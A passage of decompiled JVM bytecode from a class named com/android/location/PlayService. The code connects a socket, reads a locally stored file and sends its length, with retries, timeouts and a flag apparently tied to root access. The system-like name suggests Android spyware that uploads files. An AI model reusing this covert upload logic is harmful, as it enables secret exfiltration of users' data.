    //   1560: dup
    //   1561: ldc_w 5743
    //   1564: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1567: iload_2
    //   1568: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1571: ldc_w 3951
    //   1574: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1577: iload_3
    //   1578: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1581: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1584: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1587: aload 15
    //   1589: astore 18
    //   1591: aload 15
    //   1593: astore 19
    //   1595: aload 15
    //   1597: astore 16
    //   1599: aload 15
    //   1601: astore 20
    //   1603: aload 15
    //   1605: astore 17
    //   1607: aload 15
    //   1609: astore 13
    //   1611: ldc_w 5745
    //   1614: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1617: aload 15
    //   1619: astore 18
    //   1621: aload 15
    //   1623: astore 19
    //   1625: aload 15
    //   1627: astore 16
    //   1629: aload 15
    //   1631: astore 20
    //   1633: aload 15
    //   1635: astore 17
    //   1637: aload 15
    //   1639: astore 13
    //   1641: aload_0
    //   1642: aload_0
    //   1643: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1646: bipush 7
    //   1648: invokestatic 5747	com/android/location/PlayService:intToByteArray	(I)[B
    //   1651: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   1654: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   1657: istore 4
    //   1659: aload 15
    //   1661: astore 18
    //   1663: aload 15
    //   1665: astore 19
    //   1667: aload 15
    //   1669: astore 16
    //   1671: aload 15
    //   1673: astore 20
    //   1675: aload 15
    //   1677: astore 17
    //   1679: aload 15
    //   1681: astore 13
    //   1683: new 864	java/lang/StringBuilder
    //   1686: dup
    //   1687: ldc_w 5751
    //   1690: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1693: iload 4
    //   1695: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1698: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1701: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1704: iload 4
    //   1706: ifgt +1001 -> 2707
    //   1709: aload 15
    //   1711: astore 18
    //   1713: aload 15
    //   1715: astore 19
    //   1717: aload 15
    //   1719: astore 16
    //   1721: aload 15
    //   1723: astore 20
    //   1725: aload 15
    //   1727: astore 17
    //   1729: aload 15
    //   1731: astore 13
    //   1733: ldc_w 5753
    //   1736: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1739: aload 15
    //   1741: astore 18
    //   1743: aload 15
    //   1745: astore 19
    //   1747: aload 15
    //   1749: astore 16
    //   1751: aload 15
    //   1753: astore 20
    //   1755: aload 15
    //   1757: astore 17
    //   1759: aload 15
    //   1761: astore 13
    //   1763: new 1272	java/io/IOException
    //   1766: dup
    //   1767: invokespecial 5754	java/io/IOException:<init>	()V
    //   1770: athrow
    //   1771: astore_1
    //   1772: aload 19
    //   1774: astore 13
    //   1776: aload_0
    //   1777: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1780: astore 14
    //   1782: aload 14
    //   1784: ifnull +23 -> 1807
    //   1787: aload 19
    //   1789: astore 13
    //   1791: aload_0
    //   1792: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1795: invokevirtual 5693	java/nio/channels/SocketChannel:close	()V
    //   1798: aload 19
    //   1800: astore 13
    //   1802: aload_0
    //   1803: aconst_null
    //   1804: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1807: aload 19
    //   1809: astore 13
    //   1811: aload_1
    //   1812: invokevirtual 5755	java/net/UnknownHostException:printStackTrace	()V
    //   1815: aload 19
    //   1817: astore 13
    //   1819: aload_0
    //   1820: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   1823: ldc_w 5756
    //   1826: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   1829: iconst_0
    //   1830: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   1833: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   1836: aload 19
    //   1838: ifnull +8 -> 1846
    //   1841: aload 19
    //   1843: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   1846: iconst_2
    //   1847: ireturn
    //   1848: aload 15
    //   1850: astore 18
    //   1852: aload 15
    //   1854: astore 19
    //   1856: aload 15
    //   1858: astore 16
    //   1860: aload 15
    //   1862: astore 20
    //   1864: aload 15
    //   1866: astore 17
    //   1868: aload 15
    //   1870: astore 13
    //   1872: ldc_w 5758
    //   1875: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1878: aload 15
    //   1880: astore 18
    //   1882: aload 15
    //   1884: astore 19
    //   1886: aload 15
    //   1888: astore 16
    //   1890: aload 15
    //   1892: astore 20
    //   1894: aload 15
    //   1896: astore 17
    //   1898: aload 15
    //   1900: astore 13
    //   1902: aload_0
    //   1903: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1906: iconst_0
    //   1907: invokevirtual 5722	java/nio/channels/SocketChannel:configureBlocking	(Z)Ljava/nio/channels/SelectableChannel;
    //   1910: pop
    //   1911: aload 15
    //   1913: astore 18
    //   1915: aload 15
    //   1917: astore 19
    //   1919: aload 15
    //   1921: astore 16
    //   1923: aload 15
    //   1925: astore 20
    //   1927: aload 15
    //   1929: astore 17
    //   1931: aload 15
    //   1933: astore 13
    //   1935: new 864	java/lang/StringBuilder
    //   1938: dup
    //   1939: ldc_w 5760
    //   1942: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1945: aload 14
    //   1947: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   1950: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1953: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1956: aload 15
    //   1958: astore 18
    //   1960: aload 15
    //   1962: astore 19
    //   1964: aload 15
    //   1966: astore 16
    //   1968: aload 15
    //   1970: astore 20
    //   1972: aload 15
    //   1974: astore 17
    //   1976: aload 15
    //   1978: astore 13
    //   1980: aload_0
    //   1981: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   1984: aload 14
    //   1986: invokevirtual 5735	java/nio/channels/SocketChannel:connect	(Ljava/net/SocketAddress;)Z
    //   1989: pop
    //   1990: aload 15
    //   1992: astore 18
    //   1994: aload 15
    //   1996: astore 19
    //   1998: aload 15
    //   2000: astore 16
    //   2002: aload 15
    //   2004: astore 20
    //   2006: aload 15
    //   2008: astore 17
    //   2010: aload 15
    //   2012: astore 13
    //   2014: ldc_w 5762
    //   2017: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2020: aload 15
    //   2022: astore 18
    //   2024: aload 15
    //   2026: astore 19
    //   2028: aload 15
    //   2030: astore 16
    //   2032: aload 15
    //   2034: astore 20
    //   2036: aload 15
    //   2038: astore 17
    //   2040: aload 15
    //   2042: astore 13
    //   2044: aload_0
    //   2045: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2048: invokevirtual 5765	java/nio/channels/SocketChannel:finishConnect	()Z
    //   2051: ifeq +304 -> 2355
    //   2054: aload 15
    //   2056: astore 18
    //   2058: aload 15
    //   2060: astore 19
    //   2062: aload 15
    //   2064: astore 16
    //   2066: aload 15
    //   2068: astore 20
    //   2070: aload 15
    //   2072: astore 17
    //   2074: aload 15
    //   2076: astore 13
    //   2078: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   2081: lstore 7
    //   2083: aload 15
    //   2085: astore 18
    //   2087: aload 15
    //   2089: astore 19
    //   2091: aload 15
    //   2093: astore 16
    //   2095: aload 15
    //   2097: astore 20
    //   2099: aload 15
    //   2101: astore 17
    //   2103: aload 15
    //   2105: astore 13
    //   2107: aload_0
    //   2108: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2111: invokevirtual 5709	java/nio/channels/SocketChannel:isConnected	()Z
    //   2114: ifne -734 -> 1380
    //   2117: aload 15
    //   2119: astore 18
    //   2121: aload 15
    //   2123: astore 19
    //   2125: aload 15
    //   2127: astore 16
    //   2129: aload 15
    //   2131: astore 20
    //   2133: aload 15
    //   2135: astore 17
    //   2137: aload 15
    //   2139: astore 13
    //   2141: ldc_w 5767
    //   2144: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2147: aload 15
    //   2149: astore 18
    //   2151: aload 15
    //   2153: astore 19
    //   2155: aload 15
    //   2157: astore 16
    //   2159: aload 15
    //   2161: astore 20
    //   2163: aload 15
    //   2165: astore 17
    //   2167: aload 15
    //   2169: astore 13
    //   2171: ldc2_w 1773
    //   2174: invokestatic 1363	java/lang/Thread:sleep	(J)V
    //   2177: aload 15
    //   2179: astore 18
    //   2181: aload 15
    //   2183: astore 19
    //   2185: aload 15
    //   2187: astore 16
    //   2189: aload 15
    //   2191: astore 20
    //   2193: aload 15
    //   2195: astore 17
    //   2197: aload 15
    //   2199: astore 13
    //   2201: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   2204: lload 7
    //   2206: lsub
    //   2207: aload_0
    //   2208: getfield 1023	com/android/location/PlayService:SOCKET_READ_TIMEOUT	I
    //   2211: i2l
    //   2212: lcmp
    //   2213: ifle -130 -> 2083
    //   2216: aload 15
    //   2218: astore 18
    //   2220: aload 15
    //   2222: astore 19
    //   2224: aload 15
    //   2226: astore 16
    //   2228: aload 15
    //   2230: astore 20
    //   2232: aload 15
    //   2234: astore 17
    //   2236: aload 15
    //   2238: astore 13
    //   2240: ldc_w 5769
    //   2243: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2246: aload 15
    //   2248: astore 18
    //   2250: aload 15
    //   2252: astore 19
    //   2254: aload 15
    //   2256: astore 16
    //   2258: aload 15
    //   2260: astore 20
    //   2262: aload 15
    //   2264: astore 17
    //   2266: aload 15
    //   2268: astore 13
    //   2270: new 1272	java/io/IOException
    //   2273: dup
    //   2274: invokespecial 5754	java/io/IOException:<init>	()V
    //   2277: athrow
    //   2278: astore_1
    //   2279: aload 16
    //   2281: astore 13
    //   2283: aload_0
    //   2284: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2287: astore 14
    //   2289: aload 14
    //   2291: ifnull +23 -> 2314
    //   2294: aload 16
    //   2296: astore 13
    //   2298: aload_0
    //   2299: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2302: invokevirtual 5693	java/nio/channels/SocketChannel:close	()V
    //   2305: aload 16
    //   2307: astore 13
    //   2309: aload_0
    //   2310: aconst_null
    //   2311: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2314: aload 16
    //   2316: astore 13
    //   2318: aload_1
    //   2319: invokevirtual 3241	java/io/IOException:printStackTrace	()V
    //   2322: aload 16
    //   2324: astore 13
    //   2326: aload_0
    //   2327: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   2330: ldc_w 5770
    //   2333: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   2336: iconst_0
    //   2337: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2340: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   2343: aload 16
    //   2345: ifnull +8 -> 2353
    //   2348: aload 16
    //   2350: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   2353: iconst_3
    //   2354: ireturn
    //   2355: aload 15
    //   2357: astore 18
    //   2359: aload 15
    //   2361: astore 19
    //   2363: aload 15
    //   2365: astore 16
    //   2367: aload 15
    //   2369: astore 20
    //   2371: aload 15
    //   2373: astore 17
    //   2375: aload 15
    //   2377: astore 13
    //   2379: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   2382: lload 7
    //   2384: lsub
    //   2385: aload_0
    //   2386: getfield 1023	com/android/location/PlayService:SOCKET_READ_TIMEOUT	I
    //   2389: i2l
    //   2390: lcmp
    //   2391: ifle +132 -> 2523
    //   2394: aload 15
    //   2396: astore 18
    //   2398: aload 15
    //   2400: astore 19
    //   2402: aload 15
    //   2404: astore 16
    //   2406: aload 15
    //   2408: astore 20
    //   2410: aload 15
    //   2412: astore 17
    //   2414: aload 15
    //   2416: astore 13
    //   2418: ldc_w 5772
    //   2421: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2424: aload 15
    //   2426: astore 18
    //   2428: aload 15
    //   2430: astore 19
    //   2432: aload 15
    //   2434: astore 16
    //   2436: aload 15
    //   2438: astore 20
    //   2440: aload 15
    //   2442: astore 17
    //   2444: aload 15
    //   2446: astore 13
    //   2448: new 1272	java/io/IOException
    //   2451: dup
    //   2452: invokespecial 5754	java/io/IOException:<init>	()V
    //   2455: athrow
    //   2456: astore_1
    //   2457: aload 20
    //   2459: astore 13
    //   2461: aload_0
    //   2462: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2465: astore_1
    //   2466: aload_1
    //   2467: ifnull +23 -> 2490
    //   2470: aload 20
    //   2472: astore 13
    //   2474: aload_0
    //   2475: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2478: invokevirtual 5693	java/nio/channels/SocketChannel:close	()V
    //   2481: aload 20
    //   2483: astore 13
    //   2485: aload_0
    //   2486: aconst_null
    //   2487: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2490: aload 20
    //   2492: astore 13
    //   2494: aload_0
    //   2495: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   2498: ldc_w 5773
    //   2501: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   2504: iconst_0
    //   2505: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2508: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   2511: aload 20
    //   2513: ifnull +8 -> 2521
    //   2516: aload 20
    //   2518: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   2521: iconst_4
    //   2522: ireturn
    //   2523: aload 15
    //   2525: astore 18
    //   2527: aload 15
    //   2529: astore 19
    //   2531: aload 15
    //   2533: astore 16
    //   2535: aload 15
    //   2537: astore 20
    //   2539: aload 15
    //   2541: astore 17
    //   2543: aload 15
    //   2545: astore 13
    //   2547: ldc2_w 1773
    //   2550: invokestatic 1363	java/lang/Thread:sleep	(J)V
    //   2553: goto -533 -> 2020
    //   2556: astore_1
    //   2557: aload 17
    //   2559: astore 13
    //   2561: aload_0
    //   2562: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2565: astore 14
    //   2567: aload 14
    //   2569: ifnull +23 -> 2592
    //   2572: aload 17
    //   2574: astore 13
    //   2576: aload_0
    //   2577: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2580: invokevirtual 5693	java/nio/channels/SocketChannel:close	()V
    //   2583: aload 17
    //   2585: astore 13
    //   2587: aload_0
    //   2588: aconst_null
    //   2589: putfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   2592: aload 17
    //   2594: astore 13
    //   2596: aload_1
    //   2597: ldc_w 5774
    //   2600: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   2603: aload 17
    //   2605: astore 13
    //   2607: aload_0
    //   2608: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   2611: ldc_w 5775
    //   2614: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   2617: iconst_0
    //   2618: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   2621: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   2624: aload 17
    //   2626: ifnull +8 -> 2634
    //   2629: aload 17
    //   2631: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   2634: iconst_5
    //   2635: ireturn
    //   2636: aload 15
    //   2638: astore 18
    //   2640: aload 15
    //   2642: astore 19
    //   2644: aload 15
    //   2646: astore 16
    //   2648: aload 15
    //   2650: astore 20
    //   2652: aload 15
    //   2654: astore 17
    //   2656: aload 15
    //   2658: astore 13
    //   2660: new 864	java/lang/StringBuilder
    //   2663: dup
    //   2664: ldc_w 5777
    //   2667: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2670: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   2673: aload_0
    //   2674: getfield 940	com/android/location/PlayService:lLastSendTime	J
    //   2677: lsub
    //   2678: ldc2_w 1773
    //   2681: ldiv
    //   2682: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   2685: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2688: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2691: goto -1311 -> 1380
    //   2694: astore_1
    //   2695: aload 13
    //   2697: ifnull +8 -> 2705
    //   2700: aload 13
    //   2702: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   2705: aload_1
    //   2706: athrow
    //   2707: aload 15
    //   2709: astore 18
    //   2711: aload 15
    //   2713: astore 19
    //   2715: aload 15
    //   2717: astore 16
    //   2719: aload 15
    //   2721: astore 20
    //   2723: aload 15
    //   2725: astore 17
    //   2727: aload 15
    //   2729: astore 13
    //   2731: aload 15
    //   2733: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   2736: i2l
    //   2737: lstore 7
    //   2739: aload 15
    //   2741: astore 18
    //   2743: aload 15
    //   2745: astore 19
    //   2747: aload 15
    //   2749: astore 16
    //   2751: aload 15
    //   2753: astore 20
    //   2755: aload 15
    //   2757: astore 17
    //   2759: aload 15
    //   2761: astore 13
    //   2763: getstatic 703	com/android/location/PlayService:bUseRepeatControl	Z
    //   2766: ifeq +594 -> 3360
    //   2769: aload 15
    //   2771: astore 18
    //   2773: aload 15
    //   2775: astore 19
    //   2777: aload 15
    //   2779: astore 16
    //   2781: aload 15
    //   2783: astore 20
    //   2785: aload 15
    //   2787: astore 17
    //   2789: aload 15
    //   2791: astore 13
    //   2793: aload 15
    //   2795: lload 7
    //   2797: ldc2_w 5778
    //   2800: lsub
    //   2801: invokevirtual 5780	java/io/FileInputStream:skip	(J)J
    //   2804: pop2
    //   2805: aload 15
    //   2807: astore 18
    //   2809: aload 15
    //   2811: astore 19
    //   2813: aload 15
    //   2815: astore 16
    //   2817: aload 15
    //   2819: astore 20
    //   2821: aload 15
    //   2823: astore 17
    //   2825: aload 15
    //   2827: astore 13
    //   2829: aload 25
    //   2831: invokevirtual 5783	java/nio/ByteBuffer:clear	()Ljava/nio/Buffer;
    //   2834: pop
    //   2835: aload 15
    //   2837: astore 18
    //   2839: aload 15
    //   2841: astore 19
    //   2843: aload 15
    //   2845: astore 16
    //   2847: aload 15
    //   2849: astore 20
    //   2851: aload 15
    //   2853: astore 17
    //   2855: aload 15
    //   2857: astore 13
    //   2859: aload 15
    //   2861: aload 25
    //   2863: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   2866: iconst_0
    //   2867: iconst_4
    //   2868: invokevirtual 3602	java/io/FileInputStream:read	([BII)I
    //   2871: iconst_4
    //   2872: if_icmpeq +65 -> 2937
    //   2875: aload 15
    //   2877: astore 18
    //   2879: aload 15
    //   2881: astore 19
    //   2883: aload 15
    //   2885: astore 16
    //   2887: aload 15
    //   2889: astore 20
    //   2891: aload 15
    //   2893: astore 17
    //   2895: aload 15
    //   2897: astore 13
    //   2899: ldc_w 5785
    //   2902: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2905: aload 15
    //   2907: astore 18
    //   2909: aload 15
    //   2911: astore 19
    //   2913: aload 15
    //   2915: astore 16
    //   2917: aload 15
    //   2919: astore 20
    //   2921: aload 15
    //   2923: astore 17
    //   2925: aload 15
    //   2927: astore 13
    //   2929: new 1272	java/io/IOException
    //   2932: dup
    //   2933: invokespecial 5754	java/io/IOException:<init>	()V
    //   2936: athrow
    //   2937: aload 15
    //   2939: astore 18
    //   2941: aload 15
    //   2943: astore 19
    //   2945: aload 15
    //   2947: astore 16
    //   2949: aload 15
    //   2951: astore 20
    //   2953: aload 15
    //   2955: astore 17
    //   2957: aload 15
    //   2959: astore 13
    //   2961: aload 25
    //   2963: invokevirtual 4907	java/nio/ByteBuffer:getInt	()I
    //   2966: istore 4
    //   2968: aload 15
    //   2970: astore 18
    //   2972: aload 15
    //   2974: astore 19
    //   2976: aload 15
    //   2978: astore 16
    //   2980: aload 15
    //   2982: astore 20
    //   2984: aload 15
    //   2986: astore 17
    //   2988: aload 15
    //   2990: astore 13
    //   2992: iconst_4
    //   2993: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   2996: iload 4
    //   2998: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   3001: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   3004: astore 14
    //   3006: aload 15
    //   3008: astore 18
    //   3010: aload 15
    //   3012: astore 19
    //   3014: aload 15
    //   3016: astore 16
    //   3018: aload 15
    //   3020: astore 20
    //   3022: aload 15
    //   3024: astore 17
    //   3026: aload 15
    //   3028: astore 13
    //   3030: new 864	java/lang/StringBuilder
    //   3033: dup
    //   3034: ldc_w 5787
    //   3037: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3040: iload 4
    //   3042: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   3045: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3048: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3051: aload 15
    //   3053: astore 18
    //   3055: aload 15
    //   3057: astore 19
    //   3059: aload 15
    //   3061: astore 16
    //   3063: aload 15
    //   3065: astore 20
    //   3067: aload 15
    //   3069: astore 17
    //   3071: aload 15
    //   3073: astore 13
    //   3075: aload_0
    //   3076: aload_0
    //   3077: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   3080: aload 14
    //   3082: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   3085: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   3088: ifgt +65 -> 3153
    //   3091: aload 15
    //   3093: astore 18
    //   3095: aload 15
    //   3097: astore 19
    //   3099: aload 15
    //   3101: astore 16
    //   3103: aload 15
    //   3105: astore 20
    //   3107: aload 15
    //   3109: astore 17
    //   3111: aload 15
    //   3113: astore 13
    //   3115: ldc_w 5789
    //   3118: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3121: aload 15
    //   3123: astore 18
    //   3125: aload 15
    //   3127: astore 19
    //   3129: aload 15
    //   3131: astore 16
    //   3133: aload 15
    //   3135: astore 20
    //   3137: aload 15
    //   3139: astore 17
    //   3141: aload 15
    //   3143: astore 13
    //   3145: new 1272	java/io/IOException
    //   3148: dup
    //   3149: invokespecial 5754	java/io/IOException:<init>	()V
    //   3152: athrow
    //   3153: aload 15
    //   3155: astore 18
    //   3157: aload 15
    //   3159: astore 19
    //   3161: aload 15
    //   3163: astore 16
    //   3165: aload 15
    //   3167: astore 20
    //   3169: aload 15
    //   3171: astore 13
    //   3173: aload 15
    //   3175: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   3178: aload 15
    //   3180: astore 18
    //   3182: aload 15
    //   3184: astore 19
    //   3186: aload 15
    //   3188: astore 16
    //   3190: aload 15
    //   3192: astore 20
    //   3194: aload 15
    //   3196: astore 17
    //   3198: aload 15
    //   3200: astore 13
    //   3202: aload_0
    //   3203: aload_1
    //   3204: invokevirtual 1998	com/android/location/PlayService:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   3207: astore 14
    //   3209: aload 14
    //   3211: astore 18
    //   3213: aload 14
    //   3215: astore 19
    //   3217: aload 14
    //   3219: astore 16
    //   3221: aload 14
    //   3223: astore 20
    //   3225: aload 14
    //   3227: astore 17
    //   3229: aload 14
    //   3231: astore 13
    //   3233: new 864	java/lang/StringBuilder
    //   3236: dup
    //   3237: ldc_w 5791
    //   3240: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3243: lload 7
    //   3245: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   3248: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3251: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3254: aload 14
    //   3256: astore 18
    //   3258: aload 14
    //   3260: astore 19
    //   3262: aload 14
    //   3264: astore 16
    //   3266: aload 14
    //   3268: astore 20
    //   3270: aload 14
    //   3272: astore 17
    //   3274: aload 14
    //   3276: astore 13
    //   3278: aload_0
    //   3279: aload_0
    //   3280: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   3283: lload 7
    //   3285: l2i
    //   3286: invokestatic 5747	com/android/location/PlayService:intToByteArray	(I)[B
    //   3289: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   3292: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   3295: ifgt +173 -> 3468
    //   3298: aload 14
    //   3300: astore 18
    //   3302: aload 14
    //   3304: astore 19
    //   3306: aload 14
    //   3308: astore 16
    //   3310: aload 14
    //   3312: astore 20
    //   3314: aload 14
    //   3316: astore 17
    //   3318: aload 14
    //   3320: astore 13
    //   3322: ldc_w 5793
    //   3325: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3328: aload 14
    //   3330: astore 18
    //   3332: aload 14
    //   3334: astore 19
    //   3336: aload 14
    //   3338: astore 16
    //   3340: aload 14
    //   3342: astore 20
    //   3344: aload 14
    //   3346: astore 17
    //   3348: aload 14
    //   3350: astore 13
    //   3352: new 1272	java/io/IOException
    //   3355: dup
    //   3356: invokespecial 5754	java/io/IOException:<init>	()V
    //   3359: athrow
    //   3360: aload 15
    //   3362: astore 18
    //   3364: aload 15
    //   3366: astore 19
    //   3368: aload 15
    //   3370: astore 16
    //   3372: aload 15
    //   3374: astore 20
    //   3376: aload 15
    //   3378: astore 17
    //   3380: aload 15
    //   3382: astore 13
    //   3384: aload 15
    //   3386: astore 14
    //   3388: aload_0
    //   3389: aload_0
    //   3390: getfield 1055	com/android/location/PlayService:sch	Ljava/nio/channels/SocketChannel;
    //   3393: iconst_0
    //   3394: invokestatic 5747	com/android/location/PlayService:intToByteArray	(I)[B
    //   3397: invokestatic 4901	java/nio/ByteBuffer:wrap	([B)Ljava/nio/ByteBuffer;
    //   3400: invokespecial 5749	com/android/location/PlayService:MyWrite	(Ljava/nio/channels/SocketChannel;Ljava/nio/ByteBuffer;)I
    //   3403: ifgt -194 -> 3209
    //   3406: aload 15
    //   3408: astore 18
    //   3410: aload 15
    //   3412: astore 19
    //   3414: aload 15
    //   3416: astore 16
    //   3418: aload 15
    //   3420: astore 20
    //   3422: aload 15
    //   3424: astore 17
    //   3426: aload 15
    //   3428: astore 13
    //   3430: ldc_w 5795
    //   3433: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3436: aload 15
    //   3438: astore 18
    //   3440: aload 15
    //   3442: astore 19
    //   3444: aload 15
    //   3446: astore 16
    //   3448: aload 15
    //   3450: astore 20
    //   3452: aload 15
    //   3454: astore 17
    //   3456: aload 15
    //   3458: astore 13
    //   3460: new 1272	java/io/IOException
    //   3463: dup
    //   3464: invokespecial 5754	java/io/IOException:<init>	()V
    //   3467: athrow
    //   3468: aload 14
    //   3470: astore 18
    //   3472: aload 14
    //   3474: astore 19
    //   3476: aload 14
    //   3478: astore 16
    //   3480: aload 14
    //   3482: astore 20
    //   3484: aload 14
    //   3486: astore 17
    //   3488: aload 14
    //   3490: astore 13
    //   3492: ldc_w 5797
    //   3495: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3498: aload 14
    //   3500: astore 18
    //   3502: aload 14
    //   3504: astore 19
    //   3506: aload 14
    //   3508: astore 16
    //   3510: aload 14
    //   3512: astore 20
    //   3514: aload 14
    //   3516: astore 17
    //   3518: aload 14
    //   3520: astore 13
    //   3522: new 864	java/lang/StringBuilder
    //   3525: dup
    //   3526: ldc_w 5799
    //   3529: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3532: iload_3
    //   3533: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
